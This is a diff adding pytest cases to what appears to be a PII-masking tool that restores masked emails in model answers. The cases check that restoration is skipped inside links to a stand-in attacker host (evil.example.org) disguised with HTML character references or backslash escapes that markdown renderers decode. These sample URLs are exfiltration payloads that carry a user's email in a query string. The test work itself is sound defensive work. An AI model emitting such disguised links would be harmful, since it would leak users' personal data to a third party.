@@ -259,6 +259,49 @@ def test_own_links_with_character_references_are_restored(settings, answer, rest
     assert restore(link_state(), answer, settings).text == restored
 
 
+@pytest.mark.parametrize(
+    "answer",
+    [
+        "Отчёт: https&colon;&sol;&sol;evil.example.org/?q=<EMAIL_1> готов",
+        "Отчёт: https&#58;&#47;&#47;evil.example.org/?q=<EMAIL_1>",
+        "Отчёт: &#104;ttps&colon;&sol;&sol;evil.example.org/?q=<EMAIL_1>",
+        "Отчёт: HTTPS&colon;&sol;&sol;evil.example.org/?q=<EMAIL_1>",
+        "Отчёт: www&period;evil.example.org/?q=<EMAIL_1>",
+        r"Отчёт: https\:\/\/evil.example.org/?q=<EMAIL_1>",
+        "Отчёт: (https&colon;&sol;&sol;evil.example.org/?q=<EMAIL_1>&nbsp;x)",
+        r"[x](https\:\/\/evil.example.org/?q=<EMAIL_1>)",
+    ],
+)
+def test_nothing_is_restored_inside_a_link_that_markdown_decodes_in_prose(settings, answer):
+    """FINDINGS «Small gaps left by the findings batch of 15.10»: remark-gfm (react-markdown — во многих чатах)
+    раскрывает ссылки на знаки и экранирования «\\» в тексте и потом ищет адреса — «https&colon;&sol;&sol;evil…» и
+    «www&period;evil…» становятся ссылками. Цель ссылки CommonMark экранирования раскрывает тоже (cmark-gfm,
+    markdown-it, marked, remark)."""
+    result = restore(link_state(), answer, settings)
+    assert (result.text, kinds(result)) == (answer, ["foreign_link"])
+
+
+@pytest.mark.parametrize(
+    "answer, restored",
+    [
+        (
+            "https&colon;&sol;&sol;host-1.domain-1.example/?q=<EMAIL_1>",
+            "https&colon;&sol;&sol;srv-dc01.contoso.ru/?q=ivanov@contoso.ru",
+        ),
+        (
+            "Отчёт: https&colon;&sol;&sol;evil.example.org/x пишет <EMAIL_1>",
+            "Отчёт: https&colon;&sol;&sol;evil.example.org/x пишет ivanov@contoso.ru",
+        ),
+        (r"Tom &amp; Jerry: <EMAIL_1>, \_путь\_ C:\Users\<EMAIL_1>", r"Tom &amp; Jerry: ivanov@contoso.ru, \_путь\_ C:\Users\ivanov@contoso.ru"),
+        (r"[вики](https\://host-1.domain-1.example/<EMAIL_1>)", r"[вики](https\://srv-dc01.contoso.ru/ivanov@contoso.ru)"),
+    ],
+)
+def test_own_encoded_links_and_text_next_to_encoded_links_are_restored(settings, answer, restored):
+    """Та же находка с другой стороны: наш адрес, записанный ссылками на знаки, текст через пробел от чужого и
+    ссылки на знаки и экранирования без адреса восстанавливаются как обычно."""
+    assert restore(link_state(), answer, settings).text == restored
+
+
 def test_host_is_after_the_last_at_sign(settings):
     """Найдено при исправлении обратных косых, P1: браузер берёт хост за последним «@» адреса, а не за первым —
     «https://a@наш:1@evil…» ведёт на evil. Имя пользователя и пароль у нашего адреса ссылку чужой не делают."""
